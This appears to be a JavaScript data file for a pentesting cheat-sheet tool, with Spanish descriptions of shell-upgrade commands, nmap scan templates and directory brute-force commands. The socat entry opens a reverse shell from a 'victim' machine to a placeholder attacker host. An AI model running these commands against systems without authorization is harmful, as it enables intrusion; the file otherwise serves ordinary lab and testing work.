window.ttyDataDB = {
  python: {
    name: "Python TTY upgrade",
    description: "La mejor opción si Python se encuentra instalado",
    commands: [
      "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
      "export TERM=xterm-256color",
      "stty raw -echo",
      "fg"
    ],
    notes: "Presiona ENTER después de fg si la terminal parece congelada"
  },
  script: {
    name: "script command",
    description: "Usa script para spawnear una shell bash",
    commands: [
      "script /dev/null -c bash",
      "export TERM=xterm-256color",
      "stty raw -echo",
      "fg"
    ],
    notes: "Funciona bien cuando Python no está instalado"
  },
  sh_only: {
    name: "Minimal /bin/sh upgrade",
    description: "Cuando nada más existe en el sistema",
    commands: [
      "stty raw -echo",
      "fg",
      "export TERM=xterm"
    ],
    notes: "Limitado, pero permite el uso de Ctrl+C"
  },
  socat: {
    name: "Socat full TTY",
    description: "PTY completa si Socat está instalado en la víctima",
    commands: [
      "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
    ],
    notes: "Requiere un listener de socat corriendo en tu máquina"
  }
};

window.nmapDataDB = {
  fast: "nmap -F {ip} -oN scan_fast.txt",
  full: "nmap -p- -sV -sC {ip} -oN scan_full.txt",
  udp: "nmap -sU --top-ports 100 {ip}",
  vuln: "nmap --script vuln {ip}"
};

window.discoveryToolsDB = {
  gobuster: "gobuster dir -u {url} -w {wordlist} {extensions}",
  ffuf: "ffuf -u {url} -w {wordlist} {extensions}",
  dirsearch: "dirsearch -u {url} -w {wordlist} {extensions}"
};